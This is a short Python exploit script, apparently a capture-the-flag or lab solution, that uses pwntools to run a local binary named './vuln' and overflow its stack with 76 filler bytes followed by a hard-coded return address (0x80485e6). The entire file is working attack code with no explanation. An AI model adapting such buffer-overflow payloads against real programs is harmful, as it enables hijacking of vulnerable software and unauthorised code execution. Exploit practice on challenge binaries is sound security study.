#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("\n")

payload = (
    "A" * 76 +
    p32(0x80485e6)
)
r.sendline(payload)
print(r.recvall())
r.close()
